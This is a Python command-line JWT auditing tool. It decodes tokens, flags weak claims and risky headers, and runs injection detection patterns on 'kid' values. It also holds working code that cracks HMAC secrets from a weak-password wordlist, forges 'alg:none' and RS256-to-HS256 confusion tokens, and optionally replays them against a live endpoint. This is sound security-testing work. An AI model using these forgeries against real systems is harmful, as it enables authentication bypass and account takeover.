#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TokenSmith — JWT Security Analyzer & Weak-Secret Auditor
Made by Mindless — Founder & CEO of Linxploit
https://linxploit.com | https://linxploit.com/founder
sawefweg
WHAT THIS TOOL DOES:
    TokenSmith decodes and analyzes a JSON Web Token you already possess
    (from your own application, or one obtained during an authorized
    engagement) and runs the standard battery of JWT security checks
    used across the industry: claim hygiene (missing/excessive
    expiration, sensitive data in the payload), header risk signals
    (jku/x5u, suspicious 'kid' values), an offline HS256/384/512
    weak-secret audit against a wordlist, 'alg:none' forgery generation,
    and RS256-to-HS256 algorithm-confusion forgery generation when a
    public key is supplied.

    Everything runs OFFLINE and LOCAL by default — no network request
    is ever made. TokenSmith only reaches out to a real endpoint if you
    explicitly pass --live-test together with --verify-url, and even
    then it only replays a forged token you already generated, to see
    how the server responds. It never brute-forces credentials, never
    performs the actual takeover of an account, and never touches any
    system beyond that single opt-in request.

    Only use --live-test against systems you own or are explicitly
    authorized to test.
"""

import argparse
import base64
import concurrent.futures
import csv
import hashlib
import hmac
import json
import os
import re
import sys
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple

import requests
from colorama import Fore, Style, init as colorama_init

try:
    from cryptography.hazmat.primitives import hashes as crypto_hashes
    from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
    from cryptography.hazmat.primitives.serialization import load_pem_public_key
    from cryptography.exceptions import InvalidSignature
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:  # pragma: no cover
    CRYPTOGRAPHY_AVAILABLE = False

colorama_init(autoreset=True)
requests.packages.urllib3.disable_warnings()  # noqa

TOOL_NAME = "TokenSmith"
VERSION = "1.0.0"
AUTHOR = "Mindless"
ORG = "Linxploit"
SITE = "https://linxploit.com"
PORTFOLIO = "https://linxploit.com/founder"


GRADIENT = [
    "\033[38;5;130m", "\033[38;5;166m", "\033[38;5;172m", "\033[38;5;178m",
    "\033[38;5;214m", "\033[38;5;220m", "\033[38;5;226m", "\033[38;5;220m",
    "\033[38;5;214m", "\033[38;5;178m",
]
RESET = Style.RESET_ALL
DIM = Style.DIM
BOLD = Style.BRIGHT

C_SAFE = Fore.GREEN + BOLD
C_LOW = Fore.CYAN + BOLD
C_MED = Fore.YELLOW + BOLD
C_HIGH = "\033[38;5;208m" + BOLD
C_CRIT = Fore.RED + BOLD
C_MUTE = Fore.WHITE + DIM
C_ACC = "\033[38;5;214m" + BOLD  # gold accent
C_INFO = Fore.CYAN

SEVERITY_COLOR = {"CRITICAL": C_CRIT, "HIGH": C_HIGH, "MEDIUM": C_MED, "LOW": C_LOW, "INFO": C_INFO}
SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}


def supports_unicode() -> bool:
    enc = (sys.stdout.encoding or "").lower()
    return "utf" in enc


UNICODE_OK = supports_unicode()

BOX = {
    "tl": "╭" if UNICODE_OK else "+", "tr": "╮" if UNICODE_OK else "+",
    "bl": "╰" if UNICODE_OK else "+", "br": "╯" if UNICODE_OK else "+",
    "h": "─" if UNICODE_OK else "-", "v": "│" if UNICODE_OK else "|",
    "diamond": "◆" if UNICODE_OK else "*", "star": "✦" if UNICODE_OK else "*",
    "arrow": "▸" if UNICODE_OK else ">", "check": "✔" if UNICODE_OK else "OK",
    "cross": "✘" if UNICODE_OK else "X", "warn": "⚠" if UNICODE_OK else "!",
    "key": "⚿" if UNICODE_OK else "[K]", "dash": "·" if UNICODE_OK else "-",
}


def strip_ansi(s: str) -> str:
    return re.sub(r"\x1b\[[0-9;]*m", "", s)


def gradient_text(text: str) -> str:
    out = []
    n = max(len(GRADIENT) - 1, 1)
    for i, ch in enumerate(text):
        color = GRADIENT[int((i / max(len(text) - 1, 1)) * n)]
        out.append(color + ch)
    return "".join(out) + RESET


def render_banner():
    """A compact engraved seal instead of a full-width block-letter
    banner — the whole point is that it reads as a mark/emblem, not a
    poster."""
    spaced_name = "  ".join(TOOL_NAME.upper())
    inner_lines = [
        "",
        f"{BOX['diamond']}  {spaced_name}  {BOX['diamond']}",
        "",
        f"Forge {BOX['dash']} Crack {BOX['dash']} Fortify",
        "",
    ]
    width = max(len(strip_ansi(l)) for l in inner_lines) + 4

    def centered(line: str) -> str:
        pad = width - len(line)
        left = pad // 2
        right = pad - left
        return " " * left + line + " " * right

    print()
    print(C_ACC + BOX["tl"] + BOX["h"] * width + BOX["tr"] + RESET)
    print(C_ACC + BOX["v"] + RESET + centered(inner_lines[0]) + C_ACC + BOX["v"] + RESET)
    print(C_ACC + BOX["v"] + RESET + gradient_text(centered(inner_lines[1])) + C_ACC + BOX["v"] + RESET)
    print(C_ACC + BOX["v"] + RESET + centered(inner_lines[2]) + C_ACC + BOX["v"] + RESET)
    print(C_ACC + BOX["v"] + RESET + C_MUTE + centered(inner_lines[3]) + RESET + C_ACC + BOX["v"] + RESET)
    print(C_ACC + BOX["v"] + RESET + centered(inner_lines[4]) + C_ACC + BOX["v"] + RESET)
    print(C_ACC + BOX["bl"] + BOX["h"] * width + BOX["br"] + RESET)
    print()

    sub = f"v{VERSION} · JWT Security Analyzer & Weak-Secret Auditor"
    print(C_MUTE + sub.center(width + 2) + RESET)
    print(C_MUTE + "Offline by default. No network request without --live-test.".center(width + 2) + RESET)
    print()
    print(f"  {C_ACC}{BOX['star']}{RESET} {Fore.WHITE}Author{RESET}    {AUTHOR}  ({ORG} — Founder & CEO)")
    print(f"  {C_ACC}{BOX['star']}{RESET} {Fore.WHITE}Website{RESET}   {SITE}")
    print(f"  {C_ACC}{BOX['star']}{RESET} {Fore.WHITE}Portfolio{RESET} {PORTFOLIO}")
    print()


def section(title: str, color: str = C_ACC):
    print(f"\n{color}{BOX['diamond']} {BOLD}{title}{RESET}")
    print(color + BOX["h"] * (len(strip_ansi(title)) + 2) + RESET)


def hr(color=C_MUTE, width=70):
    print(color + BOX["h"] * width + RESET)


def b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


@dataclass
class ParsedJWT:
    raw: str
    header: dict
    payload: dict
    header_b64: str
    payload_b64: str
    signature: bytes
    signature_b64: str
    valid_structure: bool = True
    parse_error: Optional[str] = None


def parse_jwt(token: str) -> ParsedJWT:
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 3:
        return ParsedJWT(raw=token, header={}, payload={}, header_b64="", payload_b64="",
                          signature=b"", signature_b64="", valid_structure=False,
                          parse_error=f"Expected 3 dot-separated segments, found {len(parts)}.")
    header_b64, payload_b64, signature_b64 = parts
    try:
        header = json.loads(b64url_decode(header_b64))
        payload = json.loads(b64url_decode(payload_b64))
        signature = b64url_decode(signature_b64) if signature_b64 else b""
    except Exception as e:  # noqa
        return ParsedJWT(raw=token, header={}, payload={}, header_b64=header_b64, payload_b64=payload_b64,
                          signature=b"", signature_b64=signature_b64, valid_structure=False,
                          parse_error=f"Failed to decode/parse a segment: {e}")
    return ParsedJWT(raw=token, header=header, payload=payload, header_b64=header_b64,
                      payload_b64=payload_b64, signature=signature, signature_b64=signature_b64)


HMAC_ALGOS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def hmac_signature(header_b64: str, payload_b64: str, secret: str, hashfn) -> bytes:
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    return hmac.new(secret.encode("utf-8"), signing_input, hashfn).digest()


def verify_hmac_secret(parsed: ParsedJWT, secret: str) -> bool:
    alg = parsed.header.get("alg", "")
    hashfn = HMAC_ALGOS.get(alg)
    if not hashfn:
        return False
    candidate = hmac_signature(parsed.header_b64, parsed.payload_b64, secret, hashfn)
    return hmac.compare_digest(candidate, parsed.signature)


def verify_rsa_signature(parsed: ParsedJWT, public_key_pem: bytes) -> Tuple[Optional[bool], Optional[str]]:
    if not CRYPTOGRAPHY_AVAILABLE:
        return None, "The 'cryptography' package is required for RSA signature verification."
    alg = parsed.header.get("alg", "")
    if not alg.startswith("RS") and not alg.startswith("PS"):
        return None, f"Token algorithm is '{alg}', not RS*/PS* — nothing to verify against an RSA key."
    try:
        public_key = load_pem_public_key(public_key_pem)
        signing_input = f"{parsed.header_b64}.{parsed.payload_b64}".encode("ascii")
        hash_alg = {"RS256": crypto_hashes.SHA256(), "RS384": crypto_hashes.SHA384(),
                    "RS512": crypto_hashes.SHA512(), "PS256": crypto_hashes.SHA256()}.get(alg, crypto_hashes.SHA256())
        pad = rsa_padding.PSS(mgf=rsa_padding.MGF1(hash_alg), salt_length=rsa_padding.PSS.MAX_LENGTH) \
            if alg.startswith("PS") else rsa_padding.PKCS1v15()
        public_key.verify(parsed.signature, signing_input, pad, hash_alg)
        return True, None
    except InvalidSignature:
        return False, None
    except Exception as e:  # noqa
        return None, str(e)


DEFAULT_WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "changeit", "qwerty", "admin", "test",
    "development", "production", "staging", "key", "apikey", "api_key", "letmein",
    "welcome", "jwtsecret", "jwt_secret", "mysecretkey", "mysecret", "supersecret",
    "topsecret", "password123", "admin123", "root", "toor", "default", "examplesecret",
    "hunter2", "your-256-bit-secret", "your-secret-key", "signingkey", "signing_secret",
    "auth_secret", "session_secret", "s3cr3t", "p@ssw0rd", "letmein123", "changeme123",
    "1234567890", "abcdef", "abc123", "iloveyou", "monkey", "dragon", "master",
    "shadow", "superadmin", "backend", "internal", "private", "public", "testsecret",
]


def load_wordlist(path: Optional[str]) -> List[str]:
    if not path:
        return list(DEFAULT_WEAK_SECRETS)
    if not os.path.isfile(path):
        print(C_CRIT + f"[!] Wordlist file not found: {path}" + RESET)
        sys.exit(1)
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.rstrip("\n") for line in f if line.strip()]


def crack_hmac_secret(parsed: ParsedJWT, wordlist: List[str]) -> Tuple[Optional[str], int]:
    alg = parsed.header.get("alg", "")
    hashfn = HMAC_ALGOS.get(alg)
    if not hashfn:
        return None, 0
    tried = 0
    for candidate in wordlist:
        tried += 1
        sig = hmac_signature(parsed.header_b64, parsed.payload_b64, candidate, hashfn)
        if hmac.compare_digest(sig, parsed.signature):
            return candidate, tried
    return None, tried


def forge_none_variants(parsed: ParsedJWT) -> Dict[str, str]:
    variants = {}
    for alg_value in ("none", "None", "NONE", "nOnE"):
        header = dict(parsed.header)
        header["alg"] = alg_value
        header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        token = f"{header_b64}.{parsed.payload_b64}."
        variants[alg_value] = token
    return variants


def forge_alg_confusion_token(parsed: ParsedJWT, public_key_pem: bytes) -> Optional[str]:
    """Classic RS256 -> HS256 algorithm-confusion forgery: sign a token
    with alg=HS256 using the server's own RSA PUBLIC key bytes as the
    HMAC secret. A verifier that blindly trusts the 'alg' header and
    always calls the RS256 public key its 'verification secret' can be
    fooled into treating this as a validly signed HS256 token."""
    header = dict(parsed.header)
    header["alg"] = "HS256"
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{parsed.payload_b64}".encode("ascii")
    sig = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{header_b64}.{parsed.payload_b64}.{sig_b64}"



@dataclass
class Finding:
    severity: str
    category: str
    message: str


SENSITIVE_CLAIM_HINTS = ["password", "passwd", "pwd", "secret", "ssn", "social_security",
                          "credit_card", "card_number", "cvv", "api_key", "private_key", "token"]

INJECTION_PATTERNS = [
    (r"\.\./", "path traversal sequence"),
    (r"[\'\";]", "quote/statement-terminator character"),
    (r"(?i)union\s+select", "SQL UNION SELECT pattern"),
    (r"[|;&`$]", "shell metacharacter"),
]

MAX_REASONABLE_LIFETIME_DAYS = 30


def analyze_header(header: dict) -> List[Finding]:
    findings = []
    alg = header.get("alg", "")

    if alg.lower() == "none":
        findings.append(Finding("CRITICAL", "Header",
                                 "This token's own 'alg' is already 'none' — it is completely unsigned. "
                                 "Any verifier that accepts it as-is has no integrity protection at all."))

    if "jku" in header:
        findings.append(Finding("MEDIUM", "Header",
                                 f"'jku' (JWK Set URL) header present: {header['jku']!r}. If the verifier "
                                 f"fetches this URL without a strict host allowlist, an attacker who can "
                                 f"control the value can supply their own signing key."))
    if "x5u" in header:
        findings.append(Finding("MEDIUM", "Header",
                                 f"'x5u' (X.509 URL) header present: {header['x5u']!r}. Same risk class as "
                                 f"'jku' — verify the server restricts which URLs it will fetch."))

    kid = header.get("kid")
    if kid is not None:
        kid_str = str(kid)
        for pattern, label in INJECTION_PATTERNS:
            if re.search(pattern, kid_str):
                findings.append(Finding("HIGH", "Header",
                                         f"'kid' header value ({kid_str!r}) contains a {label} — if the "
                                         f"server uses 'kid' to build a file path or database query, this "
                                         f"is a classic kid-injection vector. Verify manually."))
                break

    if "typ" not in header:
        findings.append(Finding("INFO", "Header", "No 'typ' header present (informational only)."))

    return findings


def analyze_payload(payload: dict) -> List[Finding]:
    findings = []
    now = datetime.now(timezone.utc)

    exp = payload.get("exp")
    if exp is None:
        findings.append(Finding("HIGH", "Claims",
                                 "No 'exp' (expiration) claim — this token never expires by design."))
    else:
        try:
            exp_dt = datetime.fromtimestamp(int(exp), tz=timezone.utc)
            if exp_dt < now:
                findings.append(Finding("INFO", "Claims", f"Token is already expired (exp: {exp_dt.isoformat()})."))
            else:
                lifetime_days = (exp_dt - now).days
                iat = payload.get("iat")
                if iat:
                    try:
                        iat_dt = datetime.fromtimestamp(int(iat), tz=timezone.utc)
                        lifetime_days = (exp_dt - iat_dt).days
                    except Exception:  # noqa
                        pass
                if lifetime_days > MAX_REASONABLE_LIFETIME_DAYS:
                    findings.append(Finding("MEDIUM", "Claims",
                                             f"Token lifetime is {lifetime_days} day(s) — unusually long-lived "
                                             f"for a bearer token. Consider shorter expiry + refresh tokens."))
        except (ValueError, OverflowError):
            findings.append(Finding("LOW", "Claims", f"'exp' claim ({exp!r}) is not a valid Unix timestamp."))

    if "iss" not in payload:
        findings.append(Finding("INFO", "Claims", "No 'iss' (issuer) claim present."))
    if "aud" not in payload:
        findings.append(Finding("INFO", "Claims", "No 'aud' (audience) claim present."))

    def scan(obj, path=""):
        hits = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                key_path = f"{path}.{k}" if path else k
                if any(hint in k.lower() for hint in SENSITIVE_CLAIM_HINTS):
                    hits.append(key_path)
                hits.extend(scan(v, key_path))
        return hits

    sensitive_hits = scan(payload)
    if sensitive_hits:
        findings.append(Finding("MEDIUM", "Claims",
                                 f"Claim name(s) suggest sensitive data may be embedded in the payload "
                                 f"(remember: JWT payloads are base64-encoded, NOT encrypted): "
                                 f"{', '.join(sensitive_hits[:8])}"))

    return findings


# --------------------------------------------------------------------------- #
#  Live test (opt-in only)
# --------------------------------------------------------------------------- #

def live_test_token(url: str, token: str, header_name: str, timeout: int) -> dict:
    try:
        headers = {header_name: f"Bearer {token}" if header_name.lower() == "authorization" else token}
        resp = requests.get(url, headers=headers, timeout=timeout, verify=False)
        return {"status_code": resp.status_code, "response_size": len(resp.content), "error": None}
    except Exception as e:  # noqa
        return {"status_code": None, "response_size": None, "error": str(e)}


# --------------------------------------------------------------------------- #
#  Reporting
# --------------------------------------------------------------------------- #

def print_decoded(parsed: ParsedJWT):
    section("DECODED TOKEN")
    print(f"  {C_ACC}Header{RESET}")
    print(json.dumps(parsed.header, indent=2).replace("\n", "\n  "))
    print(f"\n  {C_ACC}Payload{RESET}")
    print("  " + json.dumps(parsed.payload, indent=2).replace("\n", "\n  "))
    print(f"\n  {C_MUTE}Signature: {len(parsed.signature)} byte(s) "
          f"({parsed.signature.hex()[:32]}{'...' if len(parsed.signature.hex()) > 32 else ''}){RESET}")


def print_findings(findings: List[Finding]):
    section("SECURITY FINDINGS")
    if not findings:
        print(f"  {C_SAFE}{BOX['check']} No issues found by the automated checks.{RESET}")
        return
    for f in sorted(findings, key=lambda x: SEVERITY_ORDER.get(x.severity, 5)):
        color = SEVERITY_COLOR.get(f.severity, C_MUTE)
        print(f"  {color}[{f.severity:<8}]{RESET} {C_MUTE}({f.category}){RESET} {f.message}")


def print_crack_result(secret: Optional[str], attempts: int, alg: str, elapsed: float):
    section("WEAK-SECRET AUDIT")
    if not HMAC_ALGOS.get(alg):
        print(f"  {C_MUTE}Token uses '{alg}' — not an HMAC algorithm, weak-secret audit doesn't apply.{RESET}")
        return
    if secret:
        print(f"  {C_CRIT}{BOX['warn']} SECRET RECOVERED: '{secret}'{RESET}")
        print(f"  {C_CRIT}This token can be forged by anyone who knows this secret.{RESET}")
    else:
        print(f"  {C_SAFE}{BOX['check']} Secret not found in {attempts} candidate(s) tried.{RESET}")
    print(f"  {C_MUTE}{attempts} candidate(s) checked in {elapsed:.3f}s{RESET}")


def print_forgeries(none_variants: Dict[str, str], confusion_token: Optional[str], verbose: bool):
    section("FORGED TOKENS (for authorized manual/live testing)")
    print(f"  {C_MUTE}'alg:none' variants — test whether your verifier rejects ALL of these:{RESET}")
    for alg_value, token in none_variants.items():
        shown = token if verbose else (token[:60] + "..." if len(token) > 60 else token)
        print(f"    {BOX['arrow']} alg='{alg_value}': {C_INFO}{shown}{RESET}")

    if confusion_token:
        print(f"\n  {C_MUTE}RS256→HS256 algorithm-confusion forgery:{RESET}")
        shown = confusion_token if verbose else (confusion_token[:60] + "..." if len(confusion_token) > 60 else confusion_token)
        print(f"    {BOX['arrow']} {C_INFO}{shown}{RESET}")


def save_json(data: dict, path: str):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, default=str)


def save_csv(findings: List[Finding], path: str):
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["severity", "category", "message"])
        writer.writeheader()
        for finding in findings:
            writer.writerow(asdict(finding))


# --------------------------------------------------------------------------- #
#  CLI
# --------------------------------------------------------------------------- #

def confirm_authorization() -> bool:
    print()
    print(f"{C_MED}{BOX['warn']} --live-test will send a forged token to a real endpoint.{RESET}")
    print(f"{C_MED}{BOX['warn']} Only do this against systems you OWN or are AUTHORIZED to test.{RESET}")
    try:
        answer = input(f"\n{BOLD}Type 'yes' to confirm you are authorized: {RESET}").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return False
    return answer == "yes"


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="tokensmith",
        description=f"{TOOL_NAME} — JWT Security Analyzer & Weak-Secret Auditor by {AUTHOR} ({ORG})",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  tokensmith.py -T eyJhbGciOi...\n"
            "  tokensmith.py --token-file token.txt --wordlist rockyou-jwt.txt\n"
            "  tokensmith.py -T eyJ... --public-key server.pem\n"
            "  tokensmith.py -T eyJ... --live-test --verify-url https://api.example.com/me --yes\n"
        ),
    )
    parser.add_argument("-T", "--token", help="The JWT to analyze")
    parser.add_argument("--token-file", help="Read the JWT from a file instead of the command line")
    parser.add_argument("--wordlist", help="Custom wordlist for the HS256/384/512 weak-secret audit")
    parser.add_argument("--public-key", help="PEM file with the server's RSA/EC public key "
                                              "(enables signature verification + algorithm-confusion forgery)")
    parser.add_argument("--no-crack", action="store_true", help="Skip the weak-secret audit")
    parser.add_argument("--live-test", action="store_true",
                         help="Actually send forged tokens to --verify-url (requires authorization confirmation)")
    parser.add_argument("--verify-url", help="Endpoint to replay forged tokens against, used with --live-test")
    parser.add_argument("--auth-header", default="Authorization",
                         help="Header name to send the token in for --live-test (default: Authorization)")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Live-test request timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Save results to file (.json or .csv, inferred from extension)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Show full forged tokens instead of truncated previews")
    parser.add_argument("--yes", action="store_true", help="Skip the authorization confirmation prompt for --live-test")
    parser.add_argument("--no-banner", action="store_true", help="Suppress the banner")
    parser.add_argument("--version", action="store_true", help="Show version information and exit")
    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    if args.version:
        print(f"{TOOL_NAME} v{VERSION} — by {AUTHOR} ({ORG})")
        return

    if not args.no_banner:
        render_banner()

    token = args.token
    if args.token_file:
        if not os.path.isfile(args.token_file):
            print(C_CRIT + f"[!] Token file not found: {args.token_file}" + RESET)
            sys.exit(1)
        with open(args.token_file, "r", encoding="utf-8") as f:
            token = f.read().strip()

    if not token:
        parser.print_help()
        print(C_CRIT + "\n[!] No token provided. Use -T/--token or --token-file.\n" + RESET)
        sys.exit(1)

    if args.live_test and not args.verify_url:
        print(C_CRIT + "[!] --live-test requires --verify-url.\n" + RESET)
        sys.exit(1)

    if args.live_test and not confirm_authorization():
        print(C_CRIT + "\n[!] Authorization not confirmed. Aborting.\n" + RESET)
        sys.exit(1)

    parsed = parse_jwt(token)
    if not parsed.valid_structure:
        print(C_CRIT + f"[!] Could not parse token: {parsed.parse_error}\n" + RESET)
        sys.exit(1)

    print_decoded(parsed)

    findings = analyze_header(parsed.header) + analyze_payload(parsed.payload)

    crack_result = {"secret": None, "attempts": 0, "elapsed": 0.0}
    if not args.no_crack:
        wordlist = load_wordlist(args.wordlist)
        start = time.perf_counter()
        secret, attempts = crack_hmac_secret(parsed, wordlist)
        elapsed = time.perf_counter() - start
        crack_result = {"secret": secret, "attempts": attempts, "elapsed": elapsed}
        print_crack_result(secret, attempts, parsed.header.get("alg", ""), elapsed)
        if secret:
            findings.append(Finding("CRITICAL", "Signature",
                                     f"HMAC secret recovered via wordlist audit: '{secret}'. "
                                     f"This token (and any other issued with the same secret) can be forged."))

    public_key_pem = None
    rsa_verify_result = (None, None)
    if args.public_key:
        if not os.path.isfile(args.public_key):
            print(C_CRIT + f"[!] Public key file not found: {args.public_key}" + RESET)
        else:
            with open(args.public_key, "rb") as f:
                public_key_pem = f.read()
            rsa_verify_result = verify_rsa_signature(parsed, public_key_pem)
            section("PUBLIC-KEY SIGNATURE VERIFICATION")
            valid, err = rsa_verify_result
            if valid is True:
                print(f"  {C_SAFE}{BOX['check']} Signature is valid for the supplied public key.{RESET}")
            elif valid is False:
                print(f"  {C_MED}{BOX['warn']} Signature does NOT match the supplied public key.{RESET}")
            else:
                print(f"  {C_MUTE}{err}{RESET}")

    none_variants = forge_none_variants(parsed)
    confusion_token = forge_alg_confusion_token(parsed, public_key_pem) if public_key_pem else None
    print_forgeries(none_variants, confusion_token, args.verbose)
    if confusion_token:
        findings.append(Finding("INFO", "Forgery",
                                 "An RS256→HS256 algorithm-confusion token was generated using the supplied "
                                 "public key. Test it manually (or with --live-test) against a verifier that "
                                 "might treat the public key as an HMAC secret."))

    live_results = {}
    if args.live_test:
        section("LIVE TEST RESULTS")
        candidates = {f"none ({alg})": tok for alg, tok in none_variants.items()}
        if confusion_token:
            candidates["alg-confusion (HS256)"] = confusion_token
        for label, tok in candidates.items():
            res = live_test_token(args.verify_url, tok, args.auth_header, args.timeout)
            live_results[label] = res
            if res["error"]:
                print(f"  {C_MUTE}{label}: request failed — {res['error']}{RESET}")
            else:
                code = res["status_code"]
                color = C_CRIT if code and code < 400 else C_SAFE
                verdict = "possibly ACCEPTED — verify the response manually" if code and code < 400 else "rejected"
                print(f"  {color}{label}: HTTP {code} — {verdict}{RESET}")

    print_findings(findings)

    if args.output:
        report = {
            "tool": TOOL_NAME, "version": VERSION,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "header": parsed.header, "payload": parsed.payload,
            "crack_result": crack_result,
            "rsa_signature_valid": rsa_verify_result[0],
            "forged_none_variants": none_variants,
            "forged_alg_confusion_token": confusion_token,
            "live_test_results": live_results,
            "findings": [asdict(f) for f in findings],
        }
        ext = os.path.splitext(args.output)[1].lower()
        if ext == ".csv":
            save_csv(findings, args.output)
        else:
            save_json(report, args.output)
        print(f"\n{C_SAFE}{BOX['check']} Report saved to: {args.output}{RESET}")

    print()
    hr(C_MUTE, 70)
    print(C_ACC + f"  {TOOL_NAME} · Made by {AUTHOR} — Founder & CEO of {ORG}" + RESET)
    print(C_MUTE + f"  {SITE}  |  {PORTFOLIO}" + RESET)
    hr(C_MUTE, 70)
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(C_MED + "\n\n[!] Interrupted by user. Exiting.\n" + RESET)
        sys.exit(130)
